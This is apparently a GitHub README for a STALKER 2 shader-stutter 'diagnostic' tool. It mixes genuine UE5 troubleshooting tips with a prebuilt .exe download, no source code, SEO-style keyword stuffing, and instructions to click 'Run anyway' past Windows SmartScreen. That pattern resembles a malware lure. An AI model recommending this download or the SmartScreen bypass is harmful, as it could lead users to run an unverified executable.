<p align="center">
  <img src="https://i.postimg.cc/ncnQZRw6/banner.png" alt="STALKER 2 Shader Cache Guard — UE5 Shader Compilation & Stutter Diagnostics for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-UE5%20Shader%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-stalker2--shader--guard--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# STALKER 2 Shader Cache Guard — UE5 Shader Compilation & Stutter Diagnostics for Windows

**S.T.A.L.K.E.R. 2: Heart of Chornobyl freezing on the shader compilation screen? Severe camera hitches in hubs or FPS dropping after 30 minutes of play? Start with your local AppData shader and config paths before pasting unverified Engine.ini tweaks.**

STALKER 2 Shader Cache Guard focuses on Unreal Engine 5's DirectX 12 pipeline behavior on Windows: even when the game is installed on a fast secondary NVMe drive, **shader caches and `Stalker2\Saved` configs write to `%LOCALAPPDATA%` on `C:`**. Low system-drive space, invalidated driver caches, or outdated `~mods` PAK files frequently trigger prolonged warm-ups and traversal stutter.

This project is aimed at **S.T.A.L.K.E.R. 2: Heart of Chornobyl on Windows PC**. It addresses local UE5 configuration folders, DX12 shader-cache storage headroom, and `~mods` isolation—not memory editing or unofficial binary patches.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Shader compilation screen hangs on launch | Low free disk space on `C:` or corrupted `%LOCALAPPDATA%` shader cache | Check `C:` free space (15–20 GB) and back up `Stalker2\Saved` |
| Heavy camera stutter in hubs or after driver update | GPU driver update cleared compiled DX12 Pipeline State Objects | Verify driver Shader Cache Size and allow PSOs to rebuild |
| FPS drops after 30–60 minutes of exploration | High RAM/VRAM accumulation during long sessions | Monitor VRAM headroom and adjust Hair / Global Illumination presets |
| Crash after official patch with `~mods` installed | Outdated `.pak` override in `Stalker2\Content\Paks\~mods` | Move custom `.pak` files out of `~mods` and test clean boot |

## Download for Windows

[**Download Stalker2ShaderGuard.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Stalker2ShaderGuard.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Stalker2ShaderGuard.exe`? (Automatic checks in ~2 seconds)

- Checks free space on drive `C:` where Unreal Engine 5 writes DirectX 12 shader caches.
- Locates `%LOCALAPPDATA%\Stalker2\Saved` and inspects `GameUserSettings.ini` and `Engine.ini`.
- Scans `Stalker2\Content\Paks\~mods` for third-party `.pak` files that break after updates.
- Reports GPU driver version, system RAM, and dedicated VRAM capacity.

### Sample Diagnostic Output

```text
[Stalker2ShaderGuard] Checking S.T.A.L.K.E.R. 2 UE5 caches & configs...
[OK]   Saved Directory  : C:\Users\Player\AppData\Local\Stalker2\Saved
[WARN] System Drive C:  : 9.8 GB free (Recommend 15–20 GB for DX12 shader compilation)
[OK]   Config\Windows   : GameUserSettings.ini (3.8 KB), Engine.ini (1.1 KB)
[INFO] Content\Paks\~mods: 3 custom .pak files detected
```

The release ZIP is named `Stalker2ShaderGuard.zip`; the Windows executable inside is named `Stalker2ShaderGuard.exe`.

1. Close S.T.A.L.K.E.R. 2: Heart of Chornobyl before moving or checking game files.
2. Click **Download Stalker2ShaderGuard.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Stalker2ShaderGuard.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart S.T.A.L.K.E.R. 2: Heart of Chornobyl and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a PC installation of S.T.A.L.K.E.R. 2: Heart of Chornobyl, and read access to `%LOCALAPPDATA%`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Stalker2ShaderGuard.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Shader compilation screen hangs or takes 10+ minutes

UE5 compiles Pipeline State Objects (PSOs) into `%LOCALAPPDATA%` on the Windows system drive. If `C:` has limited free space or a corrupted shader cache after a crash, warm-up stalls or repeats on every launch.

### Heavy stutter when entering settlements or rotating camera

Driver updates reset compiled DX12 shaders, causing temporary stutter while PSOs rebuild. Exceeding physical GPU VRAM with high Hair, Foliage, or Texture settings also forces slow system-RAM swapping.

### FPS degrades after 30–60 minutes of exploration

Extended play sessions can accumulate high RAM and VRAM allocation. Comparing resource usage at launch versus 30 minutes later distinguishes gradual memory buildup from baseline preset limits.

### Crashes after an official patch with `~mods` installed

Custom `.pak` files placed inside `Stalker2\Content\Paks\~mods` often override game tables or blueprints that change in official patches, causing fatal UE5 errors on boot.

## Where S.T.A.L.K.E.R. 2: Heart of Chornobyl files normally belong

On Windows PC, local configuration files, logs, and save games are stored in `%LOCALAPPDATA%`:

```text
%LOCALAPPDATA%\Stalker2\Saved\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Stalker2\Saved\
├── Config\
│   └── Windows\
│       ├── GameUserSettings.ini
│       └── Engine.ini
├── Logs\
└── SaveGames\
```

If you use custom PAK modifications, they reside separately inside your Steam installation folder at `steamapps\common\S.T.A.L.K.E.R. 2 Heart of Chornobyl\Stalker2\Content\Paks\~mods\`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Verify the latest Steam game update.** Check **Steam → Library → S.T.A.L.K.E.R. 2 → Properties → Updates** and run *Verify integrity of game files*.
2. **Check free space on drive `C:`.** Ensure at least 15–20 GB of free space on your Windows system drive for DX12 and GPU driver shader caches.
3. **Back up `Stalker2\Saved` before editing configs.** Copy `%LOCALAPPDATA%\Stalker2\Saved` to a dated folder in Documents before modifying `GameUserSettings.ini` or `Engine.ini`.
4. **Isolate `~mods` PAK files after updates.** Temporarily move custom `.pak` files out of `Stalker2\Content\Paks\~mods` if the game crashes during shader compilation.
5. **Check GPU driver shader cache limits.** In NVIDIA Control Panel or AMD Adrenalin, confirm Shader Cache Size is not set to Disabled or overly restricted.
6. **Measure frametimes in a repeatable location.** Test one graphics setting change at a time (e.g., Hair, Global Illumination, or DLSS/FSR Frame Generation) in the same hub.
7. **Restart S.T.A.L.K.E.R. 2 cleanly.** Wait for `Stalker2-Win64-Shipping.exe` to exit completely before inspecting or restoring config files.

### Before moving any files

Always copy `%LOCALAPPDATA%\Stalker2\Saved` (especially `SaveGames` and `Config\Windows`) to an external backup directory before clearing shader caches or testing `Engine.ini` parameters.

## What an effective diagnostic report should tell you

A clear diagnostic check verifies **available free space on `C:`**, inspects `GameUserSettings.ini` and `Engine.ini` timestamps, lists active `.pak` overrides in `~mods`, and records GPU driver and VRAM headroom so you can isolate shader stutter from hardware limits.

## FAQ

**Where are S.T.A.L.K.E.R. 2 config files stored on Windows?**

They are stored in `%LOCALAPPDATA%\Stalker2\Saved\Config\Windows\` (`GameUserSettings.ini` and `Engine.ini`).

**Why does the game recompile shaders after a GPU driver update?**

Graphics driver updates invalidate the previous DX12 shader cache, requiring UE5 to rebuild PSOs for the new driver.

**Should I download someone else's Engine.ini file?**

Be cautious: `Engine.ini` tweaks written for older builds or different VRAM capacities can introduce visual glitches or crashes.

**Where are S.T.A.L.K.E.R. 2 save files located?**

Steam local saves are stored under `%LOCALAPPDATA%\Stalker2\Saved\SaveGames\`.

**Can this tool fix server or quest progression bugs?**

No. It focuses strictly on local Windows configuration, shader-cache storage, and mod-folder diagnostics.

**Are any game files or mods included in this repository?**

No copyrighted game binaries, save files, or third-party mods are distributed here.

## Useful reading

- [S.T.A.L.K.E.R. 2: Heart of Chornobyl on Steam](https://store.steampowered.com/app/1643320/STALKER_2_Heart_of_Chornobyl/)
- [Official S.T.A.L.K.E.R. 2 Website](https://www.stalker2.com/)

## More Windows Game Diagnostic Tools

- [CrimsonDesert-ShaderFrameDoctor](../CrimsonDesert-ShaderFrameDoctor) — Crimson Desert DX12 shader cache & save diagnostics
- [GearsEDay-UE5StutterDoctor](../GearsEDay-UE5StutterDoctor) — Gears of War: E-Day UE5 DX12 stutter & config doctor
- [MHWilds-ShaderFrameDoctor](../MHWilds-ShaderFrameDoctor) — Monster Hunter Wilds `shader.cache2` & VRAM check
- [PoE2-RendererCrashAudit](../PoE2-RendererCrashAudit) — Path of Exile 2 DX12/Vulkan crash & `Client.txt` audit

*Independent community project. Not affiliated with GSC Game World, Valve, or Steam. All trademarks belong to their respective owners.*
 
